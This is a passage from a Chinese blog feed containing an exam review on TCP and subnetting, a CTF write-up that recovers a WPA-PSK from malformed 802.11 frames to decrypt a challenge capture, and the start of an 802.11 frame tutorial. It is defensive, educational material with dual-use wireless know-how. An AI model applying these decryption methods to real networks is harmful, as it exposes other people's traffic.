src="/2019/01/09/计算机网络期末复习/1547045687376.png" alt="1547045687376"></p><p>第一问相对简单，第二问做法将<code>145.13.160.78</code>与四个子网的掩码分别做<code>and</code>运算（这里四个子网掩码都是<code>255.255.192.0</code>），得到<code>and</code>后的网络号，即为该网络号所属子网配置的路由转发的。</p><h3 id="P201-4-64"><a href="#P201-4-64" class="headerlink" title="P201-4-64"></a><code>P201-4-64</code></h3><p>挺简单，自己写下，后面有答案。</p><h3 id="P245-5-21"><a href="#P245-5-21" class="headerlink" title="P245-5-21"></a><code>P245-5-21</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">假定使用连续ARQ协议，发送窗口大小是3，序号范围是[0,15]，二传输媒体保证在接受方能按时收到分组。接收方下一个期望收到的序号是5。试问：</span><br></pre></td></tr></table></figure><p>1、在接受方的发送窗口中可能收到的分组：</p><p>因为到4为止的报文都已经收到，若这些确认全部到达接收方，则WT=[5，7]；若所有的确认都丢失，则WT=[2，4]；若3号确认丢失，则WT=[3，5]；若4号确认丢失，则WT=[4，6]；所以，WT可能是[2，4]，[3，5]，[4，6]，[5，7]中的任何一个。</p><p>2、接收方已经发送的，但在网络中（即还未到达发送方）确认分组可能有2,3,4。因为接受方收到期望序号为5，说明序号2,3,4已经收到，并发送确认，序号1的确认肯定已经被发送方接收了，所以序号2,3,4的分组的确认还可能滞留在网络中。</p><h3 id="P245-5-22"><a href="#P245-5-22" class="headerlink" title="P245-5-22"></a><code>P245-5-22</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">主机A向主机B发送一个很长的文件,其长度为L字节。</span><br><span class="line">5—22 主机A向主机B发送一个很长的文件，其长度为L字节。假定TCP使用的MSS有1460字节。</span><br><span class="line">（1） 在TCP的序号不重复使用的条件下，L的最大值是多少？</span><br><span class="line">（2） 假定使用上面计算出文件长度，而运输层、网络层和数据链路层所使用的首部开销共66字节，链路的数据率为10Mb/s，试求这个文件所需的最短发送时间。</span><br></pre></td></tr></table></figure><p><img src="/2019/01/09/计算机网络期末复习/1547124004907.png" alt="1547124004907"></p><h3 id="P245-5-23"><a href="#P245-5-23" class="headerlink" title="P245-5-23"></a><code>P245-5-23</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">主机A向主机B连续发送了两个TCP报文段，其序号分别是70和100。</span><br><span class="line"></span><br><span class="line">试问：</span><br><span class="line"></span><br><span class="line"> (1)第一个报文段携带了多少字节的数据？ </span><br><span class="line"></span><br><span class="line">(2)主机B收到第一个报文段后发回的确认中的确认号应当是多少？ </span><br><span class="line"></span><br><span class="line">(3)主机B收到第二个报文段后发回的确认中的确认号是180，试问A发送的第二个报文段中的数据有多少字节？ </span><br><span class="line"></span><br><span class="line">(4)如果A发送的第一个报文段丢失了，但第二个报文段到达了B。B在第二个报文段到达后向A发送确认。试问这个确认号应为多少？</span><br></pre></td></tr></table></figure><p>确认号是期望收到对方的下一个报文段的数据的第一个字节的序号，也就是期望收到的下一个报文段首部序号字段的值。若确认号=N，则表明：到序号N-1为止的所有数据都已正确收到。(1)第一个报文段携带的数据包括从70字节到第99字节，共携带了30个字节。(2)确认号为100。(3)由于确认号为180，说明到第179号为止的数据都已收到，A发送的第二个报文段中的数据有179-100+1=80字节。(4)由于没有收到A发送的第一个报文段，第二个报文段到达B时将会被丢弃，因此此时收到的报文段的最后一个序号为69。当在第二个报文段到达后一向A发送确认，这个确认号应为70，表示到序号69为止的数据都已收到。</p><h3 id="P246-5-38"><a href="#P246-5-38" class="headerlink" title="P246-5-38"></a><code>P246-5-38</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">设TCP的ssthresh（慢开始门限）的初始值为8（单位为报文段）。当拥塞窗口上升到12时网络发生了超时，TCP使用慢开始和拥塞避免。试分别求出第1次到第15次传输的各拥塞窗口大小。你能说明拥塞窗口每一次变化的原因吗？</span><br></pre></td></tr></table></figure><p>（1）慢开始：在主机刚刚开始发送报文段时，可先将拥塞窗口<code>cwnd</code>设置为一个最大报文段<code>MSS</code>的数值。作用：在每收到一个对新的报文段的确认后，将拥塞窗口增加至多一个<code>MSS</code>的数值。用这样的方法逐步增大发送端的拥塞窗口<code>cwnd</code>，可以使分组注入到网络的速率更加合理。</p><p>（2）拥塞避免：当拥塞窗口值大于慢开始门限时，停止使用慢开始算法而改用拥塞避免算法。作用：拥塞避免算法使发送端的拥塞窗口每经过一个往返时延<code>RTT</code>就增加一个<code>MSS</code>的大小。</p><p>（3）当<code>cwnd&lt;ssthresh</code>时，拥塞窗口按指数规律增长；当<code>cwnd&gt;ssthresh</code>时，拥塞窗口按线性规律增长；</p><p>当发生超时时，<code>ssthresh</code>的值更新为发送窗口数值的一半。</p><p>第一轮次拥塞窗口的大小为<code>1</code>，第<code>15</code>轮次的拥塞窗口为<code>9</code>，根据慢开始算法当在第<code>4</code>个时间轮次上升到<code>8</code>时（此时拥塞窗口为<code>8</code>）改为执行拥塞避免算法（加法增大），由已知得当到第<code>8</code>个轮次的时候拥塞窗口为<code>12</code>。此时网络发生了超时，更新后的<code>ssthresh</code>值变为<code>6</code>（发送窗口<code>12</code>的一半）拥塞窗口再重新设置为<code>1</code>，并执行慢开始算法第<code>9</code>个轮次为<code>1</code>，到第<code>12</code>个轮次窗口数变为<code>6</code>开始加法增大到第<code>15</code>个轮次时拥塞窗口为<code>9</code>。</p><h3 id="P247-5-39"><a href="#P247-5-39" class="headerlink" title="P247-5-39"></a><code>P247-5-39</code></h3><p>TCP的拥塞窗口cwnd大小与传输轮次n的关系如下所示：</p><p><img src="/2019/01/09/计算机网络期末复习/1547125514495.png" alt="1547125514495"></p><p>(1)试画出如图所示的拥塞窗口与传输轮次的关系曲线。 </p><p>(2)指明<code>TCP</code>工作在慢开始阶段的时间间隔。</p><p>(3)指明<code>TCP</code>工作在拥塞避免阶段的时间间隔。 </p><p>(4)在第<code>16</code>轮次和第<code>22</code>轮次之后发送方是通过收到三个重复的确认还是通过超时检测到丢失了报文段？</p><p>(5)在第<code>1</code>轮次、第<code>18</code>轮次和第<code>24</code>轮次发送时，门限<code>ssthresh</code>分别被设置为多大？ </p><p>(6)在第几轮次发送出第<code>70</code>个报文段？</p><p>(7)假定在第<code>26</code>轮次之后收到了三个重复的确认，因而检测出了报文段的丢失，那么拥塞窗口<code>cwnd</code>和门限<code>ssthresh</code>应设置为多大？</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;期末复习，一起愉快地复习吧！&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2019-01-13 基本更新完毕，如有补充，私聊哦~&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="life" scheme="https://jianghuxia.github.io/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>护网杯-old Attack题解</title>
    <link href="https://jianghuxia.github.io/2018/11/09/%E6%8A%A4%E7%BD%91%E6%9D%AF-old-Attack%E9%A2%98%E8%A7%A3/"/>
    <id>https://jianghuxia.github.io/2018/11/09/护网杯-old-Attack题解/</id>
    <published>2018-11-09T07:20:50.000Z</published>
    <updated>2018-11-09T07:24:07.232Z</updated>
    
    <content type="html"><![CDATA[<p>经过两个星期左右的学习，深入了一番<code>IEEE 802.11</code>，终于把护网杯那题<code>0</code>解的无线流量题目做出来了，下面分析一番，稍作扩展。</p><a id="more"></a> <h4 id="护网杯-Misc-old-Attack题解"><a href="#护网杯-Misc-old-Attack题解" class="headerlink" title="护网杯-Misc-old Attack题解"></a>护网杯-Misc-old Attack题解</h4><p>题目：<code>Old Attack</code><br><code>The title is hint。:)</code></p><h5 id="题目提示"><a href="#题目提示" class="headerlink" title="题目提示"></a>题目提示</h5><p>提示先后给了三个：</p><p><code>1、Evil AKM Fuzz?</code></p><p><code>2、不规范的802.11 frame</code></p><p><code>3、malformat RSN</code></p><h5 id="题目附件"><a href="#题目附件" class="headerlink" title="题目附件"></a>题目附件</h5><p><img src="/2018/11/09/护网杯-old-Attack题解/1540960969833.png" alt="1540960969833"></p><h5 id="分析思路"><a href="#分析思路" class="headerlink" title="分析思路"></a>分析思路</h5><p>先来分析下题目的第一个提示，<code>Evil AKM Fuzz?</code>，<code>AKM</code>是啥呢？这里我网上搜了下，<code>Authentication and Key Management</code>，中文译为<code>“认证和密钥管理”</code>，那按照题目提示的意思是<code>&quot;邪恶AKM攻击&quot;</code>，<code>sorry</code>，这个我真不知道，抱歉啊，学艺不精，找到一个网站介绍<a href="http://www.tech-faq.com/rsn-robust-secure-network.html" target="_blank" rel="noopener">rsn-robust-secure-network</a>，里面有提到<code>Authentication and Key Management</code>。不过，随着解题步骤的展开，好像发现了这个提示的意义，这个后面讲。</p><p>再看看第二个提示，很明显，提示我们可能需要着重分析数据包中不规范的<code>802.11 frame</code>的数据分组。</p><p>最后一个提示，<code>malformat RSN</code>，先介绍下<code>RSN</code> (<code>Robust Secure Network</code>) ，是通过<code>802.11</code>无线网络建立安全通信的协议，这个<code>RSN</code>在<code>802.11 frame</code>的数据分组哪个地方显示呢？翻看我的上一篇文章<a href="https://www.anquanke.com/post/id/162546" target="_blank" rel="noopener">一道无线流量题目引发的思考</a>其中的<strong>管理帧中Beacon的具体分析</strong>，里面有个<code>Tag: RSN Information</code> ，然后自己去翻数据分组看看呗。</p><p>知道了这些，我们大概有这么个思路，分析<code>dict.pcapng</code>，找到能够解密<code>huwang.cap</code>握手包的秘钥，这个秘钥对于<code>wireshark</code>解密握手包而言，有三种格式，一种是针对<code>wep</code>的<code>wep</code>格式，另外两种是针对<code>WPA</code>的<code>wpa-pwd</code>和<code>wpa-psk</code>格式。详见下图</p><p><img src="/2018/11/09/护网杯-old-Attack题解/1540995564167.png" alt="1540995564167"></p><p>关于上述三种秘钥的填入的<code>Key</code>格式如下：</p><p><code>wep</code>：<code>key</code>的格式是十六进制<code>ASCII</code>码的<code>wifi</code>密码，比如此时<code>wifi</code>密码为<code>123456</code>，那么输入的<code>key</code>应该是<code>31:32:33:34:35</code>。</p><p><code>wpa-pwd</code>:<code>key</code>的格式为“密码:BSSID”，如：路由器名称为<code>T35t</code>，密码为<code>12345678</code>，那么输入的<code>key</code>应该是<code>12345678:T35t</code>。</p><p><code>wpa-psk</code>:通过<code>wireshark</code>提供的<a href="https://www.wireshark.org/tools/wpa-psk.html" target="_blank" rel="noopener">转化网址</a>，只需输入<code>ssid</code>和密码就能将其转化为<code>PSK</code>值，将这个<code>psk</code>值即是填入的<code>key</code>值（这个详细操作也可以查看我的上一篇文章<a href="https://www.anquanke.com/post/id/162546" target="_blank" rel="noopener">一道无线流量题目引发的思考</a>，里面也提到另外一种通过<code>airdecap-ng</code>工具解密的方法）。</p><p>额，这里不妨先透露个题解的步骤，此题就是通过最后一种格式<code>wpa-psk</code>对<code>huwang.cap</code>进行解密的，而在这里，知道<code>psk</code>值格式是固定的<code>64</code>位是其中解题的关键。</p><h5 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h5><h6 id="非预期解法"><a href="#非预期解法" class="headerlink" title="非预期解法"></a>非预期解法</h6><p>打开数据包<code>dict.pcapng</code>，简单分析，会发现存在大量的<code>Beacon</code>数据分组，都为畸形数据分组，并且<code>SSID</code>为大量非常见字符。</p><p><img src="/2018/11/09/护网杯-old-Attack题解/1540961199789.png" alt="1540961199789"></p><p>往下随意滑动，至中部，会发现依旧为畸形数据分组，但<code>SSID</code>变为了长度均为<code>64</code>位的字符串。（到这里，可能有师傅已经明白解题的关键步骤了）</p><p><img src="/2018/11/09/护网杯-old-Attack题解/1540961390093.png" alt="1540961390093"></p><p>比赛做到这里，卡住了，因为那时不知道如何过滤不同类型帧的语句。比赛结束后，尝试了许久，实在没想通接下去的思路。就试着过滤各种<code>802.11</code>类型帧的数据包。然后，奇迹来了。当我试着执行过滤语句<code>wlan.fc.type_subtype == 0x0005</code>过滤管理帧中类型为<code>Probe Response</code>的数据分组时，发现了下面两个分组，这引起了我的注意。</p><p><img src="/2018/11/09/护网杯-old-Attack题解/1540699047641.png" alt="1540699047641"></p><p>过滤之后，可以看到这两个畸形帧<code>SSID</code>的值均为<code>e392618fbd761a9467e64f2aaebeb0c40cfad70d1ab323dbe0741bf3fdc475a4</code>。（正好这个时候，出题老哥接受了我的好友申请，我就把自己到这步的思路跟老哥说，老哥有点惊讶”对，就是这个，你是怎么找到的?” “额，直接执行过滤语句<code>wlan.fc.type_subtype == 0x0005</code>找到的”）。</p><p><img src="/2018/11/09/护网杯-old-Attack题解/1540699096822.png" alt="1540699096822"></p><p>随后我认真的分析了下这两个数据分组，发现并不完全符合题目中两个提示的要求，这是两个<code>不规范的802.11 frame</code>，但是并不存在<code>malformat RSN</code>的数据呀。这里刚开始以为提示错了，因为按照下图所显示的，只是存在<code>ssid</code>的<code>tag</code>标签<code>Group为Malformed</code>，后面跟着的是正常的<code>Tag:RSN Information</code>的标签。（后来返回去思考，发现是自己错了，这个后面再详细解释）。额，下面这个图有个描述有错，“被”应该改为“并”。</p><p><img src="/2018/11/09/护网杯-old-Attack题解/1541035369849.png" alt="1541035369849"></p><p>但是这两个畸形帧中<code>SSID</code>的长度为<code>64</code>，注意是<code>64</code>！，并且整个数据包里只有这两条<code>Probe Response</code>此类型 5447565467帧的数据分组，你说可不可疑=</p><p>如果懂得<code>wpa-psk</code>解密的<code>key</code>的固定格式为<code>64</code>位，那么自然而然，就会想着把这个长度<code>64</code>位的字符串尝试地去进行握手包<code>huwang.cap</code>的解密，但是那个时候并不清楚这些。也就是为什么上面讲到“<strong>知道<code>psk</code>值格式是固定的<code>64</code>位是其中的关键</strong>”。（当时的我以为还是在<code>dict.pcapng</code>中找到密码，然后使用<code>aircrack-ng</code>爆破<code>huwang.cap</code>的密码，再使用验证正确的密码去解密握手包，再接着分析，所以在这里，你可能不敢相信，我把这<code>64</code>位的字符串，按每隔八位拆分，去尝试爆破出正确的密码，那时太天真了）</p><p><img src="/2018/11/09/护网杯-old-Attack题解/1540998207844.png" alt="1540998207844"></p><p>顺着刚刚的思路，打开<code>wireshark</code>，依次按照步骤操作：编辑 -&gt; 首选项 -&gt; <code>Protocols</code> -&gt; <code>IEEE 802.11</code> ，点击<code>Edit</code>，选填<code>wpa-psk</code>，输入刚刚得到的<code>PSK</code>值（那个<code>64</code>位的字符串），进行解密。（说来你可能不敢相信，那是一个慵懒的早上，我躺在床上情不自禁地想着那串<code>64</code>位长度的字符串到底是怎样能解开握手包时。突然意识到这个<code>64</code>字符串有可能是通过<code>wpa-psk</code>解密时所需要的<code>key</code>值，越想越可能，没想到还真是。这种感觉贼虚服，不知道老哥们有没有这种感觉，只可意会，不可言传。）</p><p><img src="/2018/11/09/护网杯-old-Attack题解/1540736974189.png" alt="1540736974189"></p><p>再次分析<code>huwang.cap</code>，发现上层数据均已显现出来。分析<code>http</code>，发现一个<code>/djuds8RS/1.txt</code>的访问路径</p><p><img src="/2018/11/09/护网杯-old-Attack题解/1540735875613.png" alt="1540735875613"></p><p>尝试访问，打开<code>http://www.wiattack.net/djuds8RS/1.txt</code>，得到<code>flag</code></p><p><img src="/2018/11/09/护网杯-old-Attack题解/1540690130188.png" alt="1540690130188"></p><h6 id="非预期原因"><a href="#非预期原因" class="headerlink" title="非预期原因"></a>非预期原因</h6><p>关于此题，可能由于环境部署的难度原因，出题老哥忘记做<code>Probe Response</code>此类型帧的混淆了，使得执行过滤语句<code>wlan.fc.type_subtype == 0x0005</code>就可以过滤出类型为<code>Probe Response</code>，且最为可疑<code>malformat RSN</code>数据分组中存在的畸形字长为<code>64</code>位的字符串，然后使用<code>wpa-psk</code>解密方式解密握手包<code>huwang.cap</code>，再分析解密后显现出的<code>http</code>流，即可得到最终的答案。</p><h6 id="预期解法"><a href="#预期解法" class="headerlink" title="预期解法"></a>预期解法</h6><p>准确地讲，题目虽然做出来了，但是这种解法也算是非预期解法。反过来去思考出题的思路，个人猜想出一些可能的预期解法，如下：</p><p>根据提示2，我们先过滤出<strong>不规范的802.11 frame</strong>，过滤语句<code>_ws.expert.group == &quot;Malformed&quot;</code>，这个在数据包里的过滤后的结果显示是这样的</p><p><img src="/2018/11/09/护网杯-old-Attack题解/1541035795841.png" alt="1541035795841"></p><p>根据提示3，它需要的是<code>malformat RSN</code>的数据分组，那我们先过滤出存在<code>RSN</code>的数据分组，因为如果不存在RSN信息的数据分组，我们也就不需要去判断是不是<code>malformat</code>了。但过滤语句怎么写呢？</p><p>因为<code>Tag：RSN Information</code>中<code>Tag Number</code>为48，所以构造过滤语句<code>wlan.tag.number == 48</code></p><p><img src="/2018/11/09/护网杯-old-Attack题解/1541036018414.png" alt="1541036018414"></p><p>结合提示<code>2</code>和<code>3</code>的过滤语句最后构造为<code>_ws.expert.group == &quot;Malformed&quot;&amp;&amp;wlan.tag.number == 48</code>,下图为过滤结果，过滤出来全都是含有<code>Tag：RSN Information</code>和<code>malformat</code>的帧。</p><p><img src="/2018/11/09/护网杯-old-Attack题解/1541036551342.png" alt="1541036551342"></p><p>但是提示<code>3</code>说的是<code>malformat RSN</code>，所以我们需要知道<code>Tag：RSN Information</code>为不规范的<code>malformat RSN</code>数据分组。稍微仔细点观察，翻到过滤后的数据分组末端，就会发现我们所想看到的<code>malformat RSN</code>分组。</p><p><img src="/2018/11/09/护网杯-old-Attack题解/1541037713427.png" alt="1541037713427"></p><p>上图就是分组序号<code>112936</code>得信息，但是解密的<code>wpa-psk</code>的值并不是这个分组长度<code>64</code>位的<code>ssid</code>值，但是它提供了这个异常分组的源<code>mac</code>地址和目的<code>mac</code>地址，尝试过滤下，页面如下</p><p><img src="/2018/11/09/护网杯-old-Attack题解/1541038302107.png" alt="1541038302107"></p><p>不知你有没有看到那个<code>Tag: RSN Information</code>中包含的子树所显示的<code>Auth Key Management (AKM) Suite Count: 65535</code>，当我看到这里的时候，好像明白了提示一的作用(￣▽￣)／。</p><p>而后面的解法，就跟之前提到的非预期解法一样啦。大家就自己分析去试试吧。其中的许多知识点，比如为啥<code>wpa-psk</code>值一定为<code>64</code>位等等，放了两个链接，大家随意啊。</p><p><a href="https://www.cnblogs.com/rjdeng/archive/2016/07/01/5633642.html" target="_blank" rel="noopener">无线网络密码WPA/WPA2算法介绍（适合新手阅读 ）</a></p><p><a href="http://www.tech-faq.com/rsn-robust-secure-network.html" target="_blank" rel="noopener">rsn-robust-secure-network</a></p><h5 id="题目总结"><a href="#题目总结" class="headerlink" title="题目总结"></a>题目总结</h5><p>仔细分析流量包，你会发现，其中的<code>Type/Subtype: Beacon frame (0x0008)</code>类型数据分组是做了大量混淆工作的，而说起这种混淆技术，运用的是哪种方法实现的那就够得谈了，这不仅涉及到题目的原理，也涉及到测试攻击的不同手段，下次讲咯。下面先放出本题所模拟<code>Beacon</code>大量请求的截图（本测试为个人设备演示，<code>T35t</code>为测试<code>AP</code>）：</p><p><img src="/2018/11/09/护网杯-old-Attack题解/1541047943236.png" alt="1541047943236"></p><p>最后，好好学习，天天向上。ヾ(๑╹◡╹)ﾉ”</p><p>ps:</p><p>本文由安全客原创发布  </p><p>转载，请参考<a href="https://www.anquanke.com/note/repost" target="_blank" rel="noopener">转载声明</a>，注明出处： <a href="https://www.anquanke.com/post/id/163596" target="_blank" rel="noopener">https://www.anquanke.com/post/id/163596</a>  </p><p>安全客 - 有思想的安全新媒体</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;经过两个星期左右的学习，深入了一番&lt;code&gt;IEEE 802.11&lt;/code&gt;，终于把护网杯那题&lt;code&gt;0&lt;/code&gt;解的无线流量题目做出来了，下面分析一番，稍作扩展。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>一道无线流量题目引发的思考</title>
    <link href="https://jianghuxia.github.io/2018/10/25/%E4%B8%80%E9%81%93%E6%97%A0%E7%BA%BF%E6%B5%81%E9%87%8F%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/"/>
    <id>https://jianghuxia.github.io/2018/10/25/一道无线流量题目引发的思考/</id>
    <published>2018-10-25T07:56:38.000Z</published>
    <updated>2018-10-26T04:12:21.064Z</updated>
    
    <content type="html"><![CDATA[<p>学习一番<code>IEEE 802.11</code>后，从原理性角度分析一道无线流量的CTF题目。</p><a id="more"></a> <p>在文章的开头处，先贴个<a href="http://10.254.1.201:9999/www.willhackforsushi.com/papers/80211_Pocket_Reference_Guide.pdf" target="_blank" rel="noopener">wireshark分析802.11协议的pdf链接</a>，可根据该文档所描述的内容快速过滤相应的数据包，这也是本文讲述如何使用<code>wireshark</code>学习分析<code>IEEE802.11</code>的帮助文档。不懂就翻翻咯~。本篇以一道<code>ciscn2018</code>的题目为引，从原理性分析学习<code>IEEE802.11</code>。</p><h4 id="帧的基本类型"><a href="#帧的基本类型" class="headerlink" title="帧的基本类型"></a>帧的基本类型</h4><p>关于帧的基本类型，基本上大家也都知道三种类型（贴个<a href="http://drops.xmd5.com/static/drops/wireless-15128.html" target="_blank" rel="noopener">基础知识链接</a>，不大理解的先看其中无线网络基础知识部分），这里重点讲述下管理帧。</p><h5 id="Management-frame（管理帧）"><a href="#Management-frame（管理帧）" class="headerlink" title="Management frame（管理帧）"></a>Management frame（管理帧）</h5><p>该帧的所显示的数据包一般用于各个设备之间建立第二层的连接，提供认证和连接服务。</p><p>该帧又细分为下面<code>14</code>种类型，每种类型所对应的中文注释以及过滤语句均已呈现。</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540112190240.png" alt="1540112190240"></p><p>而在管理帧中，值得重要一提的是<code>Beacon</code>，俗称<strong>信标</strong>，<code>Beacon</code>就像广播一般，向周边的其他设备声明某<code>AP</code>的类型及配置信息。下面会详细分析该帧。</p><h5 id="Control-frames（控制帧）"><a href="#Control-frames（控制帧）" class="headerlink" title="Control frames（控制帧）"></a>Control frames（控制帧）</h5><p>协助数据帧的传递，控制数据帧和管理帧的发送。</p><h5 id="Data-frame-数据帧"><a href="#Data-frame-数据帧" class="headerlink" title="Data frame (数据帧)"></a>Data frame (数据帧)</h5><p>包含真正的传输数据，最重要的是它可以将数据从无线网络转发到有线网络。在<code>wireshark</code>中，如果<code>AP</code>是使用的是<code>WEP</code>或者<code>WAP</code>加密,<code>Data frame</code>类型包，经过<code>wireshark</code>自带的解密功能<code>wep</code>、<code>wpa-pwd</code>、<code>wpa-psk</code>任意一种方法解密后，该类型数据包就会解析为更高层次的数据包，比如<code>http</code>数据包，在等会讲述的例题中，便与此相关。</p><h4 id="管理帧中Beacon的具体分析"><a href="#管理帧中Beacon的具体分析" class="headerlink" title="管理帧中Beacon的具体分析"></a>管理帧中Beacon的具体分析</h4><p>关于管理帧的具体分析，这里直接挑选<code>Beacon</code>来讲解。</p><p>为什么需要重点讲述<code>Beacon</code>呢？<code>Beacon</code>作为一个广播数据包，是一个<code>AP</code>向所有无线设备通知存在一个可用的<code>AP</code>，涵盖了一个<code>AP</code>大量的配置参数信息。另外，在<code>IEEE802.11</code>下，不同管理帧的具体内容和用途虽然不一样，但其他都与<code>Beacon</code>相似。下面即是一个<code>Beacon</code>的例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">Frame 1: 279 bytes on wire (2232 bits), 279 bytes captured (2232 bits) on interface 0</span><br><span class="line">Radiotap Header v0, Length 24</span><br><span class="line">802.11 radio information</span><br><span class="line">IEEE 802.11 Beacon frame, Flags: ........-beacon广播包</span><br><span class="line">    Type/Subtype: Beacon frame (0x0008)-可使用wlan.fc.type_subtype == 0x0008过滤</span><br><span class="line">    Frame Control Field: 0x8000</span><br><span class="line">        .... ..00 = Version: 0</span><br><span class="line">        .... 00.. = Type: Management frame (0)-帧类型为管理帧</span><br><span class="line">        1000 .... = Subtype: 8</span><br><span class="line">        Flags: 0x00</span><br><span class="line">    .000 0000 0000 0000 = Duration: 0 microseconds</span><br><span class="line">    Receiver address: Broadcast (ff:ff:ff:ff:ff:ff)</span><br><span class="line">    Destination address: Broadcast (ff:ff:ff:ff:ff:ff)</span><br><span class="line">    Transmitter address: Tp-LinkT_ca:13:df (30:<span class="built_in">fc</span>:68:ca:13:df) -传输mac地址</span><br><span class="line">    Source address: Tp-LinkT_ca:13:df (30:<span class="built_in">fc</span>:68:ca:13:df)-源地址</span><br><span class="line">    BSS Id: Tp-LinkT_ca:13:df (30:<span class="built_in">fc</span>:68:ca:13:df)-bssid</span><br><span class="line">    .... .... .... 0000 = Fragment number: 0</span><br><span class="line">    0110 1110 1011 .... = Sequence number: 11</span><br><span class="line">IEEE 802.11 wireless LAN-IEEE 802.11帧信息</span><br><span class="line">    Fixed parameters (12 bytes)-固定参数</span><br><span class="line">        Timestamp: 0x000000017752d876-发送数据包的时间戳</span><br><span class="line">        Beacon Interval: 0.102400 [Seconds]-beacon数据包的重传间隔</span><br><span class="line">        Capabilities Information: 0x0431-Wap的硬件容量信息</span><br><span class="line">    Tagged parameters (219 bytes)-标记参数</span><br><span class="line">        Tag: SSID parameter <span class="built_in">set</span>: T35t-ssid（网络名称）</span><br><span class="line">        Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6, 9, 12, 18, [Mbit/sec]</span><br><span class="line">        Tag: DS Parameter <span class="built_in">set</span>: Current Channel: 1-Wap广播信道</span><br><span class="line">        Tag: Traffic Indication Map (TIM): DTIM 0 of 0 bitmap-传输指示映射</span><br><span class="line">        Tag: ERP Information</span><br><span class="line">        Tag: Extended Supported Rates 24, 36, 48, 54, [Mbit/sec]-扩展支持速率</span><br><span class="line">        Tag: HT Capabilities (802.11n D1.10)-超线程性能</span><br><span class="line">        Tag: HT Information (802.11n D1.10)-超线程信息</span><br><span class="line">        Tag: RSN Information-安全网络信息</span><br><span class="line">        Tag: Vendor Specific: Microsoft Corp.: WPA Information Element-供应商及WPA信息</span><br><span class="line">            Tag Number: Vendor Specific (221)-供应商编号</span><br><span class="line">            Tag length: 22-长度</span><br><span class="line">            OUI: 00:50:f2 (Microsoft Corp.)-安装程序</span><br><span class="line">            Vendor Specific OUI Type: 1</span><br><span class="line">            Type: WPA Information Element (0x01)-类型</span><br><span class="line">            WPA Version: 1-WPA版本为1</span><br><span class="line">            Multicast Cipher Suite: 00:50:f2 (Microsoft Corp.) AES (CCM)-多播密码插件</span><br><span class="line">            Unicast Cipher Suite Count: 1   -单播密码套件数</span><br><span class="line">            Unicast Cipher Suite List 00:50:f2 (Microsoft Corp.) AES (CCM)  -单播密码套件列表</span><br><span class="line">            Auth Key Management (AKM) Suite Count: 1   -认证密钥管理套件数</span><br><span class="line">            Auth Key Management (AKM) List 00:50:f2 (Microsoft Corp.) PSK   -认证密钥管理列表</span><br><span class="line">        Tag: Vendor Specific: Microsoft Corp.: WMM/WME: Parameter Element</span><br><span class="line">        Tag: Vendor Specific: TP-LINK TECHNOLOGIES CO.,LTD.</span><br><span class="line">        Tag: Vendor Specific: Microsoft Corp.: WPS</span><br></pre></td></tr></table></figure><h4 id="原理性题解：2018ciscn-misc-寻找入侵者"><a href="#原理性题解：2018ciscn-misc-寻找入侵者" class="headerlink" title="原理性题解：2018ciscn-misc-寻找入侵者"></a>原理性题解：2018ciscn-misc-寻找入侵者</h4><h5 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h5><p><code>黑客使用无线钓鱼攻击一个SSID为“CyberPeace”的热点，但是我们的蜜罐系统捕获了他的数据包，并且已经得知他的握手包密码就是他的网卡地址。可是根据我们最新获得的情况，他又发送重连请求的Malformat Frame试图崩溃我们的无线路由器。请从attack包中找到密码，并解开他的数据包,找到那条畸形数据。</code></p><p>题目所给附件：</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540132034379.png" alt="1540132034379"></p><h5 id="思路解析"><a href="#思路解析" class="headerlink" 